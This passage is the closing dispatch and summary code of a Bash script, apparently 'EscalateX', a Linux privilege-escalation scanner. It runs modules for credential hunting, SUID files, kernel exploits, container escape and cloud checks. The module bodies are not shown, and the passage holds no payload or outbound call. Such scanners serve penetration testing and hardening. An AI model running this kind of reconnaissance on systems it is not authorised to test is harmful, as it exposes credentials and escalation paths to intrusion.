    credentials_hunter_main

    # Network checks
    if command -v network_checks &>/dev/null; then network_checks; fi

    # Cloud checks
    if command -v cloud_environment_checks &>/dev/null; then cloud_environment_checks; fi

    # Thorough-only checks
    if [ "$THOROUGH" ] || [ "$EXTREME_SCAN" ]; then
      if command -v container_escape_checks &>/dev/null; then container_escape_checks; fi
    fi

  else
    # Run only selected checks
    IFS=',' read -ra selected_checks <<< "$CHECKS"
    print_info "Running only selected checks: ${selected_checks[*]}"

    for check in "${selected_checks[@]}"; do
      check=$(echo "$check" | tr -d '[:space:]')
      local func_name=""

      # Map check names to function names (adjust as needed)
      case "$check" in
          system_info) func_name="system_info_checks" ;;
          user_info) func_name="user_info_checks" ;;
          suid_sgid) func_name="suid_sgid_checks" ;;
          writable_files) func_name="writable_files_checks" ;;
          cron_jobs) func_name="cron_job_checks" ;;
          docker) func_name="docker_environment_checks" ;; # Basic docker checks
          kernel) func_name="kernel_exploit_checks" ;;
          credentials) func_name="credentials_hunter_main" ;;
          network) func_name="network_checks" ;;
          container_escape) func_name="container_escape_checks" ;;
          cloud) func_name="cloud_environment_checks" ;;
          sudo) func_name="sudo_helper_checks" ;;
          *) print_warning "Unknown or unavailable check requested: $check" ;;
      esac

      # Check if the function exists and run it
      if [ -n "$func_name" ] && command -v "$func_name" &>/dev/null; then
        print_debug "Running specific check function: $func_name"
        eval "$func_name"
      elif [ -n "$func_name" ]; then
         print_warning "Check function '$func_name' for '$check' not found or module not loaded."
      fi
    done
  fi

  # Wait for any remaining background jobs if multithreaded
  wait_for_processes
  print_debug "All checks completed."

  # Cleanup temporary resources
  cleanup_resources

  # Print summary at the end
  print_summary
}

# Cleanup temporary resources
cleanup_resources() {
  if [ -n "$TEMP_DIR" ] && [ -d "$TEMP_DIR" ]; then
    print_debug "Cleaning up temporary directory: $TEMP_DIR"
    rm -rf "$TEMP_DIR"
  fi
}

# Generate a summary of findings
print_summary() {
  # Skip summary if quiet mode
  [ "$QUIET" ] && return

  print_title "Scan Summary"

  echo -e "${BLUE}[*] EscalateX scan completed at $(date)${NC}"

  # Calculate and show execution time
  END_TIME=$(date +%s)
  TOTAL_TIME=$((END_TIME - SCAN_START_TIME))
  local duration_str
  if [ "$TOTAL_TIME" -lt 60 ]; then
      duration_str="${TOTAL_TIME} seconds"
  elif [ "$TOTAL_TIME" -lt 3600 ]; then
      duration_str="$((TOTAL_TIME / 60)) minutes, $((TOTAL_TIME % 60)) seconds"
  else
       duration_str="$((TOTAL_TIME / 3600)) hours, $(((TOTAL_TIME % 3600) / 60)) minutes, $((TOTAL_TIME % 60)) seconds"
  fi
  echo -e "${BLUE}[*] Total execution time: ${WHITE}${duration_str}${NC}"

  # Show critical findings count
  if [ ${#CRITICAL_FINDINGS[@]} -gt 0 ]; then
    echo -e "${RED}[!] Critical findings detected: ${#CRITICAL_FINDINGS[@]}${NC}"
    echo -e "${RED}[!] Review the highlighted items in the scan results${NC}"
  else
    echo -e "${GREEN}[+] No critical findings detected${NC}"
  fi

  echo -e "${BLUE}[*] Remember to check the most promising privilege escalation vectors highlighted in ${RED}red${NC}"

  # Display a nice message
  echo -e "\n${GREEN}Thank you for using EscalateX!${NC}"
}

# Main initialization function
init_modules() {
  # Run the selected checks (this now includes initialization)
  run_checks
}
# Execute main function
main
